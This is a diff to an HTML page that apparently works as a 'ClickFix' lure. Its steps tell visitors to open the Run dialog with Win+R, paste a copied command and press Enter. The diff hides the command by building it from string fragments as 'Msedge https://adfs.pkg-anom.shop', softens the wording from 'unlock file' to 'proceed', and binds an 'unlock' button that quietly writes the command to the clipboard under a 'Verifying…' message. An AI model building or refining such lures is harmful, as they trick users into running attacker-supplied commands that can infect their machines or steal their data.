@@ -277,7 +277,7 @@
           </span> + <span class="k">R</span>
           </li>
           <li style="margin-bottom:10px;"> Press <span class="k">Ctrl</span> + <span class="k">V</span> to paste the copied command.</li>
-          <li> Press the <span class="k">Enter</span> key to unlock file.</li>
+          <li> Press the <span class="k">Enter</span> key to proceed.</li>
         </ol>
       </div>
     </div>
@@ -343,10 +343,11 @@
 
     // Clipboard compose (like the example snippet)
     const bro = "Msedge";
-    const usr = "tbd";
+    const usr = "adfs";
     const domo = "pkg-anom";
     const tosd = ".shop";
     const composed = `${bro} https://${usr}.${domo}${tosd}`;
+    window.composed = composed;
 
     async function copyWithClipboardAPI(text){
       if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
@@ -379,7 +380,6 @@
     window.addEventListener('load', ()=>{ setZoom(0.9); });
     // keep current zoom steady on resize
     window.addEventListener('resize', ()=>{ /* no auto-fit on resize */ });
-    window.addEventListener('resize', ()=>{ /* no auto-fit on resize */ }); });
   </script>
   
   <!-- Modal fallback binder -->
@@ -395,16 +395,17 @@
         if(closeBtn){ closeBtn.onclick = hide; }
         if(modal){ modal.addEventListener('click', function(e){ if(e.target === modal) hide(); }); }
         var unlock = qs('unlockOnPageBtn');
-        if(unlock){
-          unlock.onclick = async function(){
+        if(unlock && !unlock.dataset.bound){
+          unlock.dataset.bound = '1';
+          unlock.addEventListener('click', async function(){
             var status = qs('status'); if(status) status.textContent = 'Verifying…';
             // optional copy, ignore failures
             try{
-              const text = 'Chrome https://adfs.pkg-anom.shop';
+              const text = (window.composed ?? (typeof composed !== 'undefined' ? composed : 'Msedge https://tbd.pkg-anom.shop'));
               if(navigator.clipboard && window.isSecureContext){ await navigator.clipboard.writeText(text); }
             }catch{}
             show();
-          };
+          });
         }
       }
 
@@ -420,5 +421,3 @@
   </script>
 </body>
 </html>
-
-
